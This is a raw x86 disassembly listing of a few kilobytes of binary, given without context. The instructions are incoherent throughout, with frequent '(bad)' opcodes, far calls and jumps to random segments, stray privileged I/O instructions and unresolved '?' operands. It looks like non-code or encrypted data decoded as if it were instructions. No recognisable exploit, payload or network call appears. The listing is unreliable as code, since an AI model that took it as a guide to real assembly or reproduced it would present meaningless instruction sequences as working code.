  447056:	cmp    eax,0x8c0080f7
  44705b:	int    0x9
  44705d:	or     esp,DWORD PTR [ebp-0x24]
  447060:	fwait
  447061:	mov    cs,WORD PTR [ecx-0x65f9b70f]
  447067:	xor    edx,DWORD PTR [esi-0x6c9c3725]
  44706d:	dec    edx
  44706e:	retf   
  44706f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447070:	sub    bl,BYTE PTR [ebp+ebx*2-0x19367514]
  447077:	popf   
  447078:	mov    bl,0x9
  44707a:	push   edi
  44707b:	repz test BYTE PTR [edx-0x31b67195],ah
  447082:	pop    edx
  447083:	ins    BYTE PTR es:[edi],dx
  447084:	mov    ds:0x94a710fb,eax
  447089:	mov    dl,0x4f
  44708b:	xor    edx,DWORD PTR [eax+0x4a]
  44708e:	sbb    DWORD PTR [ecx],edi
  447090:	mov    DWORD PTR [eax-0x7b],esp
  447093:	es int 0x3
  447096:	mov    ah,0xea
  447098:	jae    0x44703c
  44709a:	push   0x14
  44709c:	adc    eax,0xd6d57805
  4470a1:	jg     0x4470a2
  4470a3:	push   esp
  4470a4:	dec    ebx
  4470a5:	retf   
  4470a6:	cmp    al,0x53
  4470a8:	jg     0x44710d
  4470aa:	call   0x7a3a:0xf8f5eb9b
  4470b1:	adc    ebx,DWORD PTR [ebx]
  4470b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4470b4:	mov    eax,0xbf423573
  4470b9:	call   FWORD PTR [eax-0x35]
  4470bc:	lea    eax,[ecx+ebx*8-0x5a]
  4470c0:	sti    
  4470c1:	test   al,0xab
  4470c3:	lahf   
  4470c4:	addr16 cwde 
  4470c6:	bound  edx,QWORD PTR [ebp+0xb]
  4470c9:	or     esp,DWORD PTR [esi+0xa2dee71]
  4470cf:	jo     0x447097
  4470d1:	scas   al,BYTE PTR es:[edi]
  4470d2:	call   0x3f8b:0x7ef5f8b6
  4470d9:	jge    0x4470cf
  4470db:	mov    al,ds:0x8accfc3e
  4470e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4470e1:	adc    al,0xba
  4470e3:	mov    edi,0x1d5648e7
  4470e8:	mov    cl,0x9f
  4470ea:	(bad)  
  4470ec:	shr    dl,0xe5
  4470ef:	push   edi
  4470f0:	or     eax,0x84a744bb
  4470f5:	ret    
  4470f6:	popf   
  4470f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4470f8:	inc    ebp
  4470f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4470fa:	test   DWORD PTR [ebx+0x199abc0a],ecx
  447100:	pcmpeqb mm7,mm7
  447103:	in     eax,dx
  447104:	fwait
  447105:	push   0xffffffa9
  447107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447108:	das    
  447109:	lods   al,BYTE PTR ds:[esi]
  44710a:	and    DWORD PTR [eax+eiz*8+0x2a9ec53e],esp
  447111:	jo     0x4470ad
  447113:	ja     0x44713a
  447115:	stos   DWORD PTR es:[edi],eax
  447116:	in     al,dx
  447117:	test   ebx,esp
  447119:	mov    dl,0x3e
  44711b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44711c:	push   es
  44711d:	shr    ch,cl
  44711f:	cmp    esi,0xb1527b8a
  447125:	xor    DWORD PTR ds:[esi+0x4fff213e],esi
  44712c:	(bad)  
  44712d:	mov    WORD PTR [edx],?
  44712f:	mov    edx,0xbbf700bc
  447134:	loope  0x447181
  447136:	mov    ecx,0x9676fa88
  44713b:	std    
  44713c:	mov    dl,0xba
  44713e:	sahf   
  44713f:	(bad)  
  447140:	shl    DWORD PTR ss:[esi],1
  447143:	inc    ecx
  447144:	popa   
  447145:	or     edi,ebx
  447147:	cmp    eax,0xa43add86
  44714c:	xchg   ebp,eax
  44714d:	sti    
  44714e:	call   0xc8aa:0x9d79ae17
  447155:	hlt    
  447156:	js     0x4470ff
  447158:	repnz in eax,dx
  44715a:	push   ecx
  44715b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44715c:	mov    ?,WORD PTR [edx]
  44715e:	dec    ebx
  44715f:	in     al,0xb2
  447161:	aas    
  447162:	dec    eax
  447163:	enter  0x3557,0x1a
  447167:	gs stos DWORD PTR es:[edi],eax
  447169:	adc    al,0x78
  44716b:	push   ebp
  44716c:	stos   BYTE PTR es:[edi],al
  44716d:	dec    edx
  44716e:	jmp    0x2c7:0x42f24df3
  447175:	pusha  
  447176:	cli    
  447177:	push   ss
  447178:	mov    ah,bh
  44717a:	sbb    ch,BYTE PTR [ebp+0x59]
  44717d:	xchg   ebx,eax
  44717e:	mov    edi,0xbbcb1aa0
  447183:	jl     0x447175
  447185:	retf   
  447186:	sub    eax,0x9d254992
  44718b:	push   ss
  44718c:	dec    edi
  44718d:	add    eax,0x5e922452
  447192:	push   ebp
  447193:	pop    ecx
  447194:	(bad)  
  447195:	das    
  447196:	push   esi
  447197:	(bad)  
  447198:	pop    edi
  447199:	or     ebp,DWORD PTR [ecx-0x3813d0d1]
  44719f:	(bad)  
  4471a0:	mov    bl,0x41
  4471a2:	mov    esi,0x13758a84
  4471a7:	stos   DWORD PTR es:[edi],eax
  4471a8:	xor    DWORD PTR [ecx+0x6c],edi
  4471ab:	sub    DWORD PTR [eax+eax*8+0x3f33857d],eax
  4471b2:	in     eax,dx
  4471b3:	(bad)  
  4471b4:	dec    ebp
  4471b5:	mov    ds:0xba64300,al
  4471ba:	add    esp,ebx
  4471bc:	cmp    BYTE PTR [eax+0x63eb5539],al
  4471c2:	call   0xd851:0x1dd925bd
  4471c9:	icebp  
  4471ca:	pop    ss
  4471cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4471cc:	call   0xfd58:0x959ad938
  4471d3:	inc    ecx
  4471d4:	mov    dl,0x7e
  4471d6:	mov    ecx,0x64763936
  4471dc:	jb     0x447253
  4471de:	ret    
  4471df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4471e0:	add    BYTE PTR [edx-0x1e1953ab],dh
  4471e6:	mov    bl,0x53
  4471e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4471e9:	inc    ebx
  4471ea:	jp     0x4471a2
  4471ec:	mov    ch,0x53
  4471ee:	mov    esp,0x1a621042
  4471f3:	ins    DWORD PTR es:[edi],dx
  4471f4:	add    al,cl
  4471f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4471f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4471f8:	push   eax
  4471f9:	sub    bh,al
  4471fb:	inc    ax
  4471fd:	push   ss
  4471fe:	enter  0x4868,0xdf
  447202:	rol    BYTE PTR [ebx-0x3ce5f6c9],0x86
  447209:	add    ecx,ebx
  44720b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44720c:	out    dx,eax
  44720d:	jge    0x4471db
  44720f:	adc    bl,dh
  447211:	and    al,0x24
  447213:	push   edx
  447214:	mov    dl,0x15
  447216:	mov    bl,ch
  447218:	sar    dl,0x8e
  44721b:	bound  edx,QWORD PTR [edi]
  44721d:	or     esi,DWORD PTR [eax+0x76a114d2]
  447223:	clc    
  447224:	test   BYTE PTR [edx],al
  447226:	(bad)  
  447227:	mov    ecx,0xd42d0bed
  44722c:	push   ebp
  44722d:	ret    0x2ddc
  447230:	fimul  WORD PTR [edx]
  447232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447233:	(bad)  
  447235:	fadd   st,st(4)
  447237:	int3   
  447238:	out    dx,eax
  447239:	fistp  DWORD PTR [ecx]
  44723b:	jmp    0x1d1d:0x479a5bc2
  447242:	cs out 0x4e,al
  447245:	(bad)  
  447246:	ins    BYTE PTR es:[edi],dx
  447247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447248:	sub    al,0xfe
  44724a:	sub    al,0x70
  44724c:	add    eax,0xb216816c
  447251:	sub    ecx,DWORD PTR [edx+0x293e689b]
  447257:	sbb    al,0x97
  447259:	or     ecx,DWORD PTR [ebx+0x58e81eb]
  44725f:	sbb    ebx,DWORD PTR [eax+ebx*8-0x7d4d0996]
  447266:	fcomp  DWORD PTR [edx-0x756b993f]
  44726c:	add    BYTE PTR es:[edi+0x1a1e4b05],ch
  447273:	inc    ebp
  447274:	mov    ebp,0xb20d54e0
  447279:	push   ebp
  44727a:	push   es
  44727b:	push   ds
  44727c:	sub    DWORD PTR [eax+0x59],eax
  44727f:	xor    al,0x68
  447281:	or     ebx,DWORD PTR [esi+0x29]
  447284:	mov    esp,0x204eeb7
  447289:	bound  esi,QWORD PTR [eax+edi*4-0x5c65b9e1]
  447290:	pop    ebx
  447291:	ss in  eax,dx
  447293:	or     DWORD PTR [bp+di],0x44
  447297:	test   eax,0x63bd5bae
  44729c:	add    BYTE PTR [edi+0x2881259b],dh
  4472a2:	in     al,dx
  4472a3:	pop    esi
  4472a4:	fwait
  4472a5:	push   edx
  4472a6:	jle    0x447272
  4472a8:	push   ebx
  4472a9:	add    eax,0xd43eb811
  4472ae:	lds    esp,FWORD PTR [edi-0x45]
  4472b1:	or     eax,0x41089784
  4472b6:	mov    ds:0xb30becd7,al
  4472bb:	sahf   
  4472bc:	pop    ds
  4472bd:	xchg   esi,eax
  4472be:	dec    ebp
  4472bf:	clc    
  4472c0:	push   ebx
  4472c1:	js     0x44728f
  4472c3:	pop    ecx
  4472c4:	add    ecx,DWORD PTR [edi+ebx*1]
  4472c7:	sbb    esp,DWORD PTR [ebx]
  4472c9:	imul   eax,ebx,0x10d03397
  4472cf:	cwde   
  4472d0:	out    dx,al
  4472d1:	mov    WORD PTR ds:0xcbe8d8a7,?
  4472d7:	jns    0x4472ff
  4472d9:	inc    esp
  4472da:	mov    edi,0x450b93d8
  4472df:	xchg   edi,eax
  4472e0:	mov    dh,0x1f
  4472e2:	cli    
  4472e3:	loop   0x447272
  4472e5:	addr16 sahf 
  4472e7:	gs dec esi
  4472e9:	inc    ebp
  4472ea:	into   
  4472eb:	mov    bh,0x32
  4472ed:	push   esi
  4472ee:	pop    edx
  4472ef:	inc    ebx
  4472f0:	push   edx
  4472f1:	add    al,0x17
  4472f3:	cs mov bl,0x28
  4472f6:	sbb    dl,bl
  4472f8:	scas   al,BYTE PTR es:[edi]
  4472f9:	enter  0xcddc,0xb2
  4472fd:	and    esp,DWORD PTR [esp+ecx*1+0x63a9f51b]
  447304:	dec    eax
  447305:	add    bl,BYTE PTR [eax]
  447307:	jle    0x447369
  447309:	sub    esp,DWORD PTR [edi+0x20]
  44730c:	mov    dl,0x95
  44730e:	imul   edi,DWORD PTR [ecx-0x63],0x173086f3
  447315:	sti    
  447316:	fbld   TBYTE PTR [edi-0xd9fc085]
  44731c:	pop    esi
  44731d:	mov    ch,0x81
  44731f:	push   DWORD PTR [edx+0x651f9ed7]
  447325:	xchg   esp,eax
  447326:	in     al,dx
  447327:	xchg   BYTE PTR [edx-0x63c2c5f5],ah
  44732d:	cwde   
  44732e:	repz fnstcw WORD PTR [ebp-0x26b88614]
  447335:	ret    0x519a
  447338:	jle    0x44738f
  44733a:	mov    al,ds:0x4a6420b3
  44733f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447340:	stc    
  447341:	test   edi,0x54d2b7cf
  447347:	test   DWORD PTR [esi+0x378bb8fc],0x2b569b9b
  447351:	mov    esi,0x3b76a6ae
  447356:	lock sub DWORD PTR [esi-0x23589bc2],0x2d
  44735e:	out    dx,eax
  44735f:	test   BYTE PTR [edx],0xeb
  447362:	call   0x2a9d:0x552eb554
  447369:	fnstcw WORD PTR [edx]
  44736b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44736c:	dec    esp
  44736d:	arpl   WORD PTR [esi],si
  44736f:	dec    ebx
  447370:	xchg   ebp,eax
  447371:	inc    esi
  447372:	jg     0x447309
  447374:	mov    dl,0x52
  447376:	lods   eax,DWORD PTR ds:[esi]
  447377:	aam    0xf0
  447379:	sub    BYTE PTR [eax-0xbf3b00a],dh
  44737f:	jbe    0x4473ad
  447381:	(bad)  
  447382:	xchg   edx,eax
  447383:	in     eax,0x96
  447385:	and    ebx,edx
  447387:	ja     0x447331
  447389:	stc    
  44738a:	call   0x669d:0x45f15070
  447391:	sbb    eax,0x1cb4fb96
  447396:	loopne 0x44733f
  447398:	adc    eax,0x4bcef7c5
  44739d:	clc    
  44739e:	(bad)  
  44739f:	and    cl,BYTE PTR [ecx+0x47270bb1]
  4473a5:	pop    edi
  4473a6:	sbb    esp,eax
  4473a8:	mov    esp,0x70a0b183
  4473ad:	cs cmp bl,dl
  4473b0:	addr16 jnp 0x447357
  4473b3:	cld    
  4473b4:	(bad)  
  4473b5:	(bad)  
  4473b6:	call   0xc28a:0xa2c48191
  4473bd:	dec    esi
  4473be:	adc    eax,DWORD PTR [ecx+0x5c]
  4473c1:	or     edx,ebx
  4473c3:	adc    DWORD PTR [eax-0x76],esp
  4473c6:	inc    esp
  4473c7:	mov    bl,0xc0
  4473c9:	pusha  
  4473ca:	call   0x9044:0x45e66ec4
  4473d1:	outs   dx,BYTE PTR ds:[esi]
  4473d2:	mov    al,0x41
  4473d4:	jno    0x44740d
  4473d6:	and    bh,0xb2
  4473d9:	call   0x17ef:0xe15d14d5
  4473e0:	mov    dl,0xa3
  4473e2:	gs loope 0x447380
  4473e5:	pop    esi
  4473e6:	push   esp
  4473e7:	aaa    
  4473e8:	xchg   DWORD PTR [ebx],esp
  4473ea:	push   es
  4473eb:	xor    al,0x37
  4473ed:	or     ebx,eax
  4473ef:	xor    ah,dl
  4473f1:	out    dx,eax
  4473f2:	adc    DWORD PTR [eax],0xe29a3dd2
  4473f8:	iret   
  4473f9:	xchg   ecx,eax
  4473fa:	xchg   BYTE PTR [edi+0x33],ah
  4473fd:	aaa    
  4473fe:	pop    esi
  4473ff:	aam    0x36
  447401:	or     BYTE PTR [eax+0x569aa2ea],dl
  447407:	outs   dx,DWORD PTR ds:[esi]
  447408:	sub    ah,bh
  44740a:	jge    0x447450
  44740c:	mov    dl,0x7f
  44740e:	and    edx,edx
  447410:	ins    DWORD PTR es:[edi],dx
  447411:	(bad)  
  447413:	mov    ah,0xf7
  447415:	or     eax,DWORD PTR [esi+edi*8-0x3c]
  447419:	pop    eax
  44741a:	sub    eax,0x2eb705c
  44741f:	int3   
  447420:	mov    dl,0x2
  447422:	nop
  447423:	daa    
  447424:	mov    edx,ebp
  447426:	stos   DWORD PTR es:[edi],eax
  447427:	mov    dh,0x62
  447429:	or     esp,DWORD PTR [eax]
  44742b:	cwde   
  44742c:	adc    edi,DWORD PTR [esi+edx*1]
  44742f:	xchg   BYTE PTR [esi],cl
  447431:	pop    es
  447432:	jmp    0xdd36:0x18b4b240
  447439:	shl    edx,0xb2
  44743c:	out    0x17,eax
  44743e:	pop    eax
  44743f:	dec    esp
  447440:	inc    eax
  447441:	adc    eax,0xa881275c
  447446:	inc    edi
  447447:	or     eax,0x1b9a8231
  44744c:	mov    ebx,0xb972ce98
  447451:	test   ebp,ebx
  447453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447454:	pop    ds
  447455:	lahf   
  447456:	dec    esp
  447457:	(bad)  
  447459:	ins    DWORD PTR es:[edi],dx
  44745a:	add    eax,DWORD PTR [edx-0x3ca77253]
  447460:	repz jp 0x4474b5
  447463:	push   esp
  447464:	icebp  
  447465:	adc    BYTE PTR [edi+0x1a],cl
  447468:	dec    esi
  447469:	imul   ebp,edx,0xffffffa7
  44746c:	pop    ss
  44746d:	pop    eax
  44746e:	dec    esi
  44746f:	mov    ah,cl
  447471:	xchg   edx,eax
  447472:	(bad)
  447476:	add    eax,0x1afd3aee
  44747b:	je     0x447453
  44747d:	or     esi,DWORD PTR [esi]
  44747f:	ins    BYTE PTR es:[edi],dx
  447480:	repz xchg ebx,eax
  447482:	xor    BYTE PTR [eax+0x2f],bh
  447485:	loopne 0x447420
  447487:	mov    ah,0xcb
  447489:	arpl   WORD PTR fs:0x27e6eb2c,dx
  447490:	nop
  447491:	or     ebp,DWORD PTR [ecx+0x19]
  447494:	mov    edx,0x1484dc4b
  447499:	mov    cl,0x94
  44749b:	(bad)  
  44749c:	loope  0x447497
  44749e:	shl    esi,1
  4474a0:	mov    dh,0x91
  4474a2:	adc    al,0x65
  4474a4:	dec    edx
  4474a5:	add    BYTE PTR [edi+0x19a7f1a7],al
  4474ab:	push   edi
  4474ac:	bound  esi,QWORD PTR [esi+0x2eb2583e]
  4474b2:	out    dx,al
  4474b3:	jp     0x4474bc
  4474b5:	xor    ebx,DWORD PTR [ebx-0x43e8b1f3]
  4474bb:	enter  0xcc1,0xac
  4474bf:	inc    esp
  4474c0:	mov    eax,ds:0x5b3f032b
  4474c5:	jp     0x447461
  4474c7:	inc    ecx
  4474c8:	mov    cl,BYTE PTR [ecx]
  4474ca:	sub    DWORD PTR [edx+ebp*2+0x37d4c9cf],0xbd88dd0b
  4474d5:	(bad)  
  4474d6:	xor    ecx,edx
  4474d8:	and    BYTE PTR [edx+0x28107c9d],bh
  4474de:	int    0xc6
  4474e0:	mov    ds:0xaf4b5fe3,al
  4474e5:	or     ecx,DWORD PTR [ebp-0x62ae1c85]
  4474eb:	or     cl,BYTE PTR [ebp+ebx*4+0x6964779a]
  4474f2:	xchg   BYTE PTR [ebp+0x5bc6a809],bl
  4474f8:	inc    esp
  4474f9:	add    bl,al
  4474fb:	ds mov al,0x60
  4474fe:	call   0xb2a8:0xab95497d
  447505:	das    
  447506:	xchg   edi,eax
  447507:	cmp    esp,DWORD PTR [eax]
  447509:	and    al,0xb4
  44750b:	mov    eax,edi
  44750d:	or     ecx,DWORD PTR [edi-0x53]
  447510:	or     al,0xd8
  447512:	sub    al,0x29
  447514:	loopne 0x447503
  447516:	call   0xd04d:0x6d667f3d
  44751d:	scas   eax,DWORD PTR es:[edi]
  44751e:	fsub   DWORD PTR [edi-0x4da79d79]
  447524:	jl     0x44750c
  447526:	dec    eax
  447527:	pop    edi
  447528:	mov    dl,0x10
  44752a:	loopne 0x44750c
  44752c:	cdq    
  44752d:	sbb    BYTE PTR [ebp+0x3b384c6],dl
  447533:	mov    DWORD PTR [ebx+0x51],esp
  447536:	dec    ecx
  447537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447538:	mov    ds:0x625d1636,eax
  44753d:	xlat   BYTE PTR ds:[ebx]
  44753e:	arpl   cx,si
  447540:	mov    BYTE PTR [edx+ebx*4-0x21],0x75
  447545:	xor    al,0x27
  447547:	(bad)  [eax]
  447549:	sub    al,ch
  44754b:	sar    DWORD PTR [edx+0x1b01e40b],1
  447551:	call   0x7a8f860b
  447556:	call   0xb087:0xef337429
  44755d:	sbb    bl,dl
  44755f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447560:	test   BYTE PTR [esi+eax*1],bh
  447563:	pop    es
  447564:	call   0xb28e5256
  447569:	jmp    0xe82d:0x8c916deb
  447570:	inc    edi
  447571:	add    cl,cl
  447573:	mov    dl,0x2c
  447575:	push   es
  447576:	jp     0x4474f9
  447578:	int3   
  447579:	enter  0xc084,0xb8
  44757d:	and    ebx,DWORD PTR [edx+0x17]
  447580:	xor    cl,dl
  447582:	fucomip st,st(4)
  447584:	ret    0x6a0b
  447587:	sub    al,0x87
  447589:	(bad)  [eax-0x62bcdbd3]
  44758f:	adc    BYTE PTR [edx],cl
  447591:	cmp    esp,DWORD PTR [ecx]
  447593:	mov    ebx,0x675a1337
  447598:	sub    DWORD PTR [ebp+ecx*4+0x73842da7],ebp
  44759f:	and    bl,0x97
  4475a2:	sub    DWORD PTR [ebp+0xc8460b1],ecx
  4475a8:	push   ss
  4475a9:	and    ah,dh
  4475ab:	das    
  4475ac:	mov    al,ds:0x65a77d00
  4475b1:	mov    ebx,DWORD PTR [ebp+0x3c886458]
  4475b7:	fist   WORD PTR [edx+ecx*8-0x63]
  4475bb:	sbb    DWORD PTR [edi],eax
  4475bd:	sub    DWORD PTR [ecx+edx*8-0x572869ee],ebx
  4475c4:	gs sti 
  4475c6:	xor    eax,0xda9958f7
  4475cb:	pop    edi
  4475cc:	xor    eax,0x5c897ab6
  4475d1:	mov    esi,DWORD PTR [edx-0x5a113962]
  4475d7:	repz popa 
  4475d9:	xor    BYTE PTR [ebx-0x5c],dl
  4475dc:	(bad)
  4475df:	popa   
  4475e0:	cdq    
  4475e1:	mov    ebx,ebp
  4475e3:	loop   0x4475ec
  4475e5:	or     esi,edi
  4475e7:	retf   
  4475e8:	and    dh,BYTE PTR cs:[edx+0x1e]
  4475ec:	rcl    DWORD PTR [ebx-0x66],0x1c
  4475f0:	pop    ss
  4475f1:	mov    eax,0x55bc623b
  4475f6:	xchg   BYTE PTR [edx+0x651a8698],bl
  4475fc:	pop    ebp
  4475fd:	sbb    DWORD PTR [ebx+0x34],0x1e
  447601:	pop    eax
  447602:	call   0xa3e8:0xb40c6eb1
  447609:	sahf   
  44760a:	and    DWORD PTR [edi-0x25d18f6e],esp
  447610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447611:	out    0x55,al
  447613:	inc    ecx
  447614:	mov    cl,0x5b
  447616:	sbb    bh,BYTE PTR [esi+0x3450d8eb]
  44761c:	outs   dx,DWORD PTR ds:[esi]
  44761d:	repz scas al,BYTE PTR es:[edi]
  44761f:	pushf  
  447620:	outs   dx,BYTE PTR ds:[esi]
  447621:	or     esi,DWORD PTR [ebx-0x2c]
  447624:	sub    bh,BYTE PTR [ebp+0x1465a5e]
  44762a:	fwait
  44762b:	into   
  44762c:	push   ebx
  44762d:	lahf   
  44762e:	enter  0xf023,0x3c
  447632:	stos   BYTE PTR es:[edi],al
  447633:	ins    BYTE PTR es:[edi],dx
  447634:	call   0x755faf94
  447639:	xor    al,BYTE PTR [eax]
  44763b:	xchg   ecx,eax
  44763c:	mov    cl,0xdf
  44763e:	add    eax,0x4587d1f8
  447643:	sub    BYTE PTR [edx+0x5a],dl
  447646:	iret   
  447647:	sub    DWORD PTR [ebx],edi
  447649:	aam    0x95
  44764b:	and    bl,BYTE PTR ds:0xc2676c37
  447651:	rcl    BYTE PTR [eax+0x217bf471],cl
  447657:	aam    0xaa
  447659:	or     ebx,ecx
  44765b:	rcl    DWORD PTR [ebx],cl
  44765d:	repnz pushf 
  44765f:	dec    eax
  447660:	jb     0x447641
  447662:	sub    edi,ebx
  447664:	mov    dl,0x7e
  447666:	mov    dl,0x49
  447668:	outs   dx,DWORD PTR ds:[esi]
  447669:	sub    DWORD PTR [edi-0x1af45084],esi
  44766f:	mov    ecx,0x36117c61
  447674:	bnd ja 0x44765a
  447677:	sub    esi,DWORD PTR [edx-0x724d27e5]
  44767d:	mov    dl,0x32
  44767f:	push   edi
  447680:	jmp    0x44768c
  447682:	pop    eax
  447683:	sub    ah,BYTE PTR [ebx-0x35]
  447686:	sub    esi,DWORD PTR [edx]
  447688:	mul    BYTE PTR [edx+edi*1]
  44768b:	adc    ebx,DWORD PTR [ebx+ecx*1-0x36]
  44768f:	jge    0x44762d
  447691:	scas   al,BYTE PTR es:[edi]
  447692:	repnz (bad) 
  447694:	in     al,0x74
  447696:	call   0xea41:0xe349bada
  44769d:	mov    ecx,0xc7fdb8c6
  4476a2:	ins    DWORD PTR es:[edi],dx
  4476a3:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4476a5:	sub    bl,dh
  4476a7:	loop   0x4476ef
  4476a9:	rcl    eax,0xb0
  4476ac:	dec    esi
  4476ad:	xor    ecx,DWORD PTR [ebp-0x7df4f03c]
  4476b3:	cld    
  4476b4:	jne    0x4476cb
  4476b6:	push   cs
  4476b7:	xchg   DWORD PTR [esi-0x5fa40055],ecx
  4476bd:	test   al,0xec
  4476bf:	pop    edi
  4476c0:	lods   al,BYTE PTR ds:[esi]
  4476c1:	setp   BYTE PTR [eax-0x4f]
  4476c5:	ins    DWORD PTR es:[edi],dx
  4476c6:	enter  0x531f,0xb
  4476ca:	inc    eax
  4476cb:	in     eax,0x44
  4476cd:	xor    al,0x48
  4476cf:	push   edx
  4476d0:	outs   dx,DWORD PTR ds:[esi]
  4476d1:	push   ss
  4476d2:	call   0x8eae:0xd9d33d22
  4476d9:	push   esi
  4476da:	daa    
  4476db:	push   edi
  4476dc:	xchg   esp,eax
  4476dd:	or     ebp,DWORD PTR [ebx+0x23b0c3bd]
  4476e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4476e4:	xor    ebp,DWORD PTR [eax]
  4476e6:	call   0xe501:0xd12fe321
  4476ed:	sub    ah,BYTE PTR ds:[edi+0x7103aa4a]
  4476f4:	stos   DWORD PTR es:[edi],eax
  4476f5:	cli    
  4476f6:	(bad)  
  4476f7:	jb     0x4476ab
  4476f9:	outs   dx,BYTE PTR ds:[esi]
  4476fa:	xor    eax,0x27df5ae4
  4476ff:	scas   al,BYTE PTR es:[edi]
  447700:	test   DWORD PTR [edi],0xc00bd83e
  447706:	jbe    0x4476f2
  447708:	mov    ch,0xa5
  44770a:	stos   BYTE PTR es:[edi],al
  44770b:	sbb    DWORD PTR [ebp-0x5e49053c],ebp
  447711:	imul   eax,DWORD PTR [ebx-0x59],0xffffffc4
  447715:	mov    ah,0x27
  447717:	mov    ebp,0x4fedf497
  44771c:	mov    dl,0xf3
  44771e:	inc    edi
  44771f:	pop    esp
  447720:	fsubr  QWORD PTR [ebx]
  447722:	sar    DWORD PTR [ecx],1
  447724:	jmp    0x7c214434
  447729:	add    al,0xa1
  44772b:	xchg   ecx,eax
  44772c:	lods   eax,DWORD PTR ds:[esi]
  44772d:	mov    WORD PTR [edx-0x2842a218],ds
  447733:	jmp    0xa071a4bd
  447738:	lahf   
  447739:	pop    ecx
  44773a:	stos   DWORD PTR es:[edi],eax
  44773b:	xchg   edx,eax
  44773c:	jle    0x447769
  44773e:	jle    0x447799
  447740:	fstp   TBYTE PTR [edi+0x76]
  447743:	adc    eax,0x389b9302
  447748:	xor    BYTE PTR [eax+edx*1-0x80],dh
  44774c:	stos   BYTE PTR es:[edi],al
  44774d:	xor    bl,BYTE PTR [edx]
  44774f:	fwait
  447750:	xor    ebp,DWORD PTR [esi]
  447752:	or     bh,BYTE PTR [ecx+0x14]
  447755:	sbb    al,0x9d
  447757:	mov    ds:0x620faa24,ax
  44775d:	add    ebx,ebp
  44775f:	mov    dl,0xf2
  447761:	or     BYTE PTR [edi+0x2fa41946],al
  447767:	ret    0x57b2
  44776a:	mov    bl,0x85
  44776c:	ficomp WORD PTR [eax]
  44776e:	lea    ecx,[eax-0x3b]
  447771:	push   cs
  447772:	aad    0xb9
  447774:	dec    esp
  447775:	lods   eax,DWORD PTR ds:[esi]
  447776:	lock and al,BYTE PTR [edi+0x3a49720b]
  44777d:	daa    
  44777e:	jns    0x44778d
  447780:	pushf  
  447781:	xor    esi,DWORD PTR [edi]
  447783:	jmp    0x447742
  447785:	shl    BYTE PTR [edi+eiz*4+0x39],cl
  447789:	ret    
  44778a:	mov    ebp,0x6e0cb86b
  44778f:	sub    eax,0xb7c83efe
  447794:	inc    ebx
  447795:	mov    es,esp
  447797:	add    eax,0xcbe91cb2
  44779c:	or     DWORD PTR [edx],ecx
  44779e:	pop    edx
  44779f:	inc    eax
  4477a0:	cmp    eax,0x32d0b633
  4477a5:	add    bh,dh
  4477a7:	pop    eax
  4477a8:	dec    esp
  4477a9:	cmp    ecx,DWORD PTR [edi]
  4477ab:	stos   BYTE PTR es:[edi],al
  4477ac:	mov    dl,0x52
  4477ae:	sbb    bl,BYTE PTR [edx-0xa]
  4477b1:	jecxz  0x44779c
  4477b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4477b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4477b5:	stc    
  4477b6:	pop    es
  4477b7:	fdiv   DWORD PTR [esi]
  4477b9:	add    eax,0xd3be1f31
  4477be:	fisub  DWORD PTR [esi-0x4b08ec46]
  4477c4:	mov    dl,0x7b
  4477c6:	pop    ecx
  4477c7:	mov    ch,0x8a
  4477c9:	fdiv   st,st(0)
  4477cb:	iret   
  4477cc:	and    BYTE PTR [ebx],cl
  4477ce:	dec    DWORD PTR [esi+0x2ef8cbd4]
  4477d4:	push   ebx
  4477d5:	lods   eax,DWORD PTR ds:[esi]
  4477d6:	call   0x7485:0x907baff1
  4477dd:	jbe    0x4477ea
  4477df:	sahf   
  4477e0:	int    0x14
  4477e2:	sbb    dh,BYTE PTR [esi+0x22]
  4477e5:	cmp    ebp,DWORD PTR [ecx]
  4477e7:	fstp   QWORD PTR [ecx+0x57]
  4477ea:	call   0x7454:0x58ba6669
  4477f1:	cmp    al,0x84
  4477f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4477f4:	lea    edi,[edi+0x3e]
  4477f7:	jmp    0x9b5e:0x6fafd1d8
  4477fe:	call   0x4aae:0xe20053e
  447805:	push   edi
  447806:	mul    BYTE PTR [edi-0x64e2d2e1]
  44780c:	(bad)  
  44780d:	or     ah,BYTE PTR [eax*2+0x3b7a7db2]
  447814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447815:	mov    ?,WORD PTR [ecx+0x370b1e12]
  44781b:	sbb    ebx,DWORD PTR [eax+0x64]
  44781e:	dec    eax
  44781f:	xor    eax,0x7993f05
  447824:	pop    esp
  447825:	ins    BYTE PTR es:[edi],dx
  447826:	and    al,0xe1
  447828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447829:	mov    ebx,0xb1df7a8
  44782e:	adc    eax,0xcdb6ffe9
  447833:	int3   
  447834:	dec    cx
  447836:	call   0xefce:0xcb65e85f
  44783d:	shl    DWORD PTR ss:[edi+0x67eba0b0],0xec
